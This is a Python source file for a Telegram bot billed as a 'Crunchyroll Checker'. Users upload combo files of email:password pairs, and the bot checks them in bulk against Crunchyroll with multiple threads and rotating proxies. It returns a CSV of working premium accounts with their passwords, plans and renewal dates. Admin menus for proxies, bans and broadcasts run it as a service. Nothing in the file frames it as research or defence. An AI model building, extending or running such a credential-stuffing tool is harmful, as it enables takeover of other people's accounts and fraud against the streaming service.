#!/usr/bin/env python3
import asyncio
import io
import csv
import datetime
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, CallbackQueryHandler, filters, ContextTypes

import config
from database import Database
from checker import CrunchyrollChecker

# ===== DELETE WEBHOOK TO FIX CONFLICT =====
print("🔄 Cleaning up old webhooks...")
try:
    webhook_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/deleteWebhook"
    response = requests.get(webhook_url, timeout=10)
    print(f"✅ Webhook deleted: {response.json()}")
except Exception as e:
    print(f"⚠️ Webhook cleanup: {e}")
# ==========================================

print("🚀 LOADING BOT...")
print(f"🔑 Bot Token exists: {bool(config.BOT_TOKEN)}")
print(f"👑 Admins: {config.ADMIN_IDS}")

db = Database()
os.makedirs("data/exports", exist_ok=True)

# ============= KEYBOARD BUTTONS =============

def main_menu(user_id):
    keyboard = [
        [InlineKeyboardButton("🍣 CHECK CRUNCHYROLL 🍣", callback_data="check_crunchyroll")],
        [InlineKeyboardButton("📧 HOTMAIL CHECKER", callback_data="hotmail_checker")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="my_stats"),
         InlineKeyboardButton("📜 MY HISTORY", callback_data="my_history")],
        [InlineKeyboardButton("❓ HELP", callback_data="help"),
         InlineKeyboardButton("📞 SUPPORT", callback_data="support")]
    ]
    
    if user_id in config.ADMIN_IDS:
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL 👑", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(keyboard)

def admin_panel_menu():
    keyboard = [
        [InlineKeyboardButton("📊 STATISTICS", callback_data="admin_stats"),
         InlineKeyboardButton("👥 ALL USERS", callback_data="admin_users")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast"),
         InlineKeyboardButton("🔌 MANAGE PROXIES", callback_data="admin_proxies")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def proxy_menu():
    keyboard = [
        [InlineKeyboardButton("➕ ADD PROXY", callback_data="proxy_add"),
         InlineKeyboardButton("📋 LIST PROXIES", callback_data="proxy_list")],
        [InlineKeyboardButton("🗑 DELETE PROXY", callback_data="proxy_delete")],
        [InlineKeyboardButton("🔙 BACK TO ADMIN", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def back_button():
    keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(keyboard)

# ============= BOT HANDLERS =============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    db.add_user(user.id, user.username, user.first_name)
    
    if user.id in config.ADMIN_IDS:
        db.make_admin(user.id)
    
    welcome_msg = """
╔══════════════════════════════════════╗
║   🎬 CRUNCHYROLL CHECKER BOT v2.0   ║
╚══════════════════════════════════════╝

✨ **FEATURES:**
├─ 🔐 Multi-threaded account checking
├─ 🌐 Proxy rotation support
├─ 📊 Live progress bar
├─ 💾 CSV export
├─ 👑 Admin panel
└─ 🚀 24/7 uptime

📤 **HOW TO USE:**
Click the CHECK CRUNCHYROLL button and upload a .txt file

📝 **FILE FORMAT:**
email:password
one per line

Welcome! 👋
"""
    
    await update.message.reply_text(welcome_msg, reply_markup=main_menu(user.id), parse_mode="Markdown")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    if db.is_banned(user_id) and data not in ["support", "help"]:
        await query.edit_message_text("❌ YOU ARE BANNED!", reply_markup=back_button())
        return
    
    if data == "back_to_main":
        await query.edit_message_text("Main Menu:", reply_markup=main_menu(user_id))
    
    elif data == "check_crunchyroll":
        await query.edit_message_text(
            "📤 **UPLOAD YOUR COMBO FILE**\n\nSend a .txt file with email:password format",
            parse_mode="Markdown",
            reply_markup=back_button()
        )
        context.user_data['waiting_for_file'] = True
    
    elif data == "hotmail_checker":
        await query.edit_message_text("📧 **HOTMAIL CHECKER**\n\n🚧 COMING SOON!", parse_mode="Markdown", reply_markup=back_button())
    
    elif data == "my_stats":
        user_data = db.get_user(user_id)
        if user_data:
            stats_text = f"""
📊 **YOUR STATISTICS**

├─ Total checks: {user_data[6] or 0}
├─ Total hits: {user_data[7] or 0}
├─ Hit rate: {((user_data[7] or 0) / (user_data[6] or 1) * 100):.1f}%
├─ Checks today: {user_data[8] or 0}
└─ Member since: {user_data[3][:10] if user_data[3] else 'N/A'}
"""
            await query.edit_message_text(stats_text, parse_mode="Markdown", reply_markup=back_button())
        else:
            await query.edit_message_text("No data found!", reply_markup=back_button())
    
    elif data == "my_history":
        logs = db.get_user_logs(user_id)
        if logs:
            history_text = "📜 **YOUR CHECK HISTORY**\n\n"
            for log in logs:
                history_text += f"📁 {log[0]}\n   ├─ {log[1]} accounts\n   └─ ✅ {log[2]} hits\n\n"
            await query.edit_message_text(history_text, parse_mode="Markdown", reply_markup=back_button())
        else:
            await query.edit_message_text("No history found!", reply_markup=back_button())
    
    elif data == "help":
        help_text = """
❓ **HOW TO USE**

1️⃣ Click CHECK CRUNCHYROLL button
2️⃣ Upload .txt file (email:password format)
3️⃣ Wait for checking
4️⃣ Download CSV with valid accounts

**SUPPORT:** Contact @admin
"""
        await query.edit_message_text(help_text, parse_mode="Markdown", reply_markup=back_button())
    
    elif data == "support":
        support_text = "📞 Contact your bot administrator for support."
        await query.edit_message_text(support_text, reply_markup=back_button())
    
    elif data == "admin_panel" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("👑 **ADMIN PANEL**", parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_stats" and user_id in config.ADMIN_IDS:
        stats = db.get_stats()
        stats_text = f"""
📊 **BOT STATISTICS**

├─ 👥 Total users: {stats['total_users']}
├─ 📈 Total checks: {stats['total_checks']}
├─ 🎯 Total hits: {stats['total_hits']}
├─ 📊 Hit rate: {stats['hit_rate']:.2f}%
└─ 🔥 Active today: {stats['active_today']}
"""
        await query.edit_message_text(stats_text, parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_users" and user_id in config.ADMIN_IDS:
        users = db.get_all_users()
        users_text = "👥 **ALL USERS**\n\n"
        for user in users[:20]:
            status = "🚫 BANNED" if user[5] else "✅ ACTIVE"
            users_text += f"🆔 `{user[0]}`\n   ├─ {user[1] or 'No username'}\n   ├─ Checks: {user[3]}\n   ├─ Hits: {user[4]}\n   └─ {status}\n\n"
        await query.edit_message_text(users_text, parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_proxies" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🔌 **PROXY MANAGEMENT**\n\nFormat: ip:port or ip:port:user:pass", reply_markup=proxy_menu())
    
    elif data == "proxy_add" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("➕ Send proxy (ip:port or ip:port:user:pass):", reply_markup=proxy_menu())
        context.user_data['add_proxy_mode'] = True
    
    elif data == "proxy_list" and user_id in config.ADMIN_IDS:
        proxies = db.get_proxies()
        if proxies:
            text = "🔌 **YOUR PROXIES**\n\n"
            for i, p in enumerate(proxies[:20], 1):
                text += f"{i}. `{p}`\n"
        else:
            text = "No proxies found."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=proxy_menu())
    
    elif data == "proxy_delete" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🗑 Send the exact proxy string to delete:", reply_markup=proxy_menu())
        context.user_data['delete_proxy_mode'] = True
    
    elif data == "admin_broadcast" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("📢 Send the message to broadcast:", reply_markup=admin_panel_menu())
        context.user_data['broadcast_mode'] = True
    
    elif data == "admin_ban" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🚫 Send user ID to ban:", reply_markup=admin_panel_menu())
        context.user_data['ban_mode'] = True
    
    elif data == "admin_unban" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("✅ Send user ID to unban:", reply_markup=admin_panel_menu())
        context.user_data['unban_mode'] = True

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.user_data.get('waiting_for_file'):
        await update.message.reply_text("❌ Please click CHECK CRUNCHYROLL button first!", reply_markup=main_menu(user_id))
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!", reply_markup=main_menu(user_id))
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a .txt file!", reply_markup=main_menu(user_id))
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').split('\n')
    
    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))
    
    if not accounts:
        await status_msg.edit_text("❌ No valid accounts found!")
        return
    
    await status_msg.edit_text(f"✅ Loaded {len(accounts)} accounts!\n\n🔄 Starting check...")
    
    proxies = db.get_proxies()
    
    checker = CrunchyrollChecker(
        auth_header=config.CRUNCHYROLL_AUTH_HEADER,
        proxies=proxies if proxies else None,
        threads=config.DEFAULT_THREADS
    )
    
    progress_msg = await update.message.reply_text("🔄 Checking accounts... 0%")
    hits = []
    
    async def update_progress(current, total, result):
        if result['success']:
            hits.append(result)
        if current % 10 == 0 or current == total:
            percent = (current / total) * 100
            try:
                await progress_msg.edit_text(
                    f"🔄 **PROGRESS**\n├─ Processed: {current}/{total}\n├─ Hits: {len(hits)}\n└─ {percent:.1f}%",
                    parse_mode="Markdown"
                )
            except:
                pass
    
    checker.set_progress_callback(lambda c, t, r: asyncio.create_task(update_progress(c, t, r)))
    
    results, hits = checker.check_accounts(accounts)
    
    db.update_stats(user_id, len(accounts), len(hits))
    db.add_log(user_id, document.file_name, len(accounts), len(hits))
    context.user_data['waiting_for_file'] = False
    
    if hits:
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        csv_buffer = io.StringIO()
        writer = csv.writer(csv_buffer)
        writer.writerow(['Email', 'Password', 'Plan', 'Country', 'Renewal Date'])
        for hit in hits:
            writer.writerow([hit['email'], hit['password'], hit['plan'], hit['country'], hit['renewal']])
        csv_buffer.seek(0)
        
        result_text = f"🎯 **COMPLETE!**\n\n✅ Valid premium: {len(hits)}\n❌ Invalid: {len(accounts) - len(hits)}"
        
        await progress_msg.delete()
        await update.message.reply_text(result_text, parse_mode="Markdown")
        await update.message.reply_document(
            document=io.BytesIO(csv_buffer.getvalue().encode('utf-8')),
            filename=f"crunchyroll_hits_{timestamp}.csv",
            caption=f"✅ {len(hits)} premium accounts!"
        )
    else:
        await progress_msg.edit_text("❌ **NO PREMIUM ACCOUNTS FOUND!**", parse_mode="Markdown")
    
    await update.message.reply_text("Main Menu:", reply_markup=main_menu(user_id))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "/cancel":
        context.user_data.clear()
        await update.message.reply_text("✅ Cancelled!", reply_markup=main_menu(user_id))
        return
    
    # Broadcast mode
    if context.user_data.get('broadcast_mode') and user_id in config.ADMIN_IDS:
        users = db.get_all_users()
        sent = 0
        status_msg = await update.message.reply_text("📢 Sending broadcast...")
        
        for user in users:
            try:
                await context.bot.send_message(user[0], f"📢 **BROADCAST**\n\n{text}", parse_mode="Markdown")
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await status_msg.edit_text(f"✅ Sent to {sent}/{len(users)} users!")
        context.user_data.pop('broadcast_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    # Ban mode
    if context.user_data.get('ban_mode') and user_id in config.ADMIN_IDS:
        try:
            target_id = int(text)
            db.ban_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} BANNED!")
        except:
            await update.message.reply_text("❌ Invalid user ID!")
        context.user_data.pop('ban_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    # Unban mode
    if context.user_data.get('unban_mode') and user_id in config.ADMIN_IDS:
        try:
            target_id = int(text)
            db.unban_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} UNBANNED!")
        except:
            await update.message.reply_text("❌ Invalid user ID!")
        context.user_data.pop('unban_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    # Add proxy mode
    if context.user_data.get('add_proxy_mode') and user_id in config.ADMIN_IDS:
        if db.add_proxy(text):
            await update.message.reply_text(f"✅ Proxy added: `{text}`", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Invalid or duplicate proxy!")
        context.user_data.pop('add_proxy_mode', None)
        await update.message.reply_text("Proxy Menu:", reply_markup=proxy_menu())
        return
    
    # Delete proxy mode
    if context.user_data.get('delete_proxy_mode') and user_id in config.ADMIN_IDS:
        db.delete_proxy(text)
        await update.message.reply_text(f"✅ Proxy deleted: `{text}`", parse_mode="Markdown")
        context.user_data.pop('delete_proxy_mode', None)
        await update.message.reply_text("Proxy Menu:", reply_markup=proxy_menu())
        return
    
    await update.message.reply_text("Please use the BUTTONS below 👇", reply_markup=main_menu(user_id))

async def main():
    print("🤖 Bot is starting...")
    
    if not config.BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN is not set!")
        return
    
    app = Application.builder().token(config.BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    print("✅ Handlers added")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    print("✅ BOT IS RUNNING! Go to Telegram and send /start")
    
    await asyncio.Event().wait()

# Add missing import for CommandHandler
from telegram.ext import CommandHandler

if __name__ == "__main__":
    asyncio.run(main())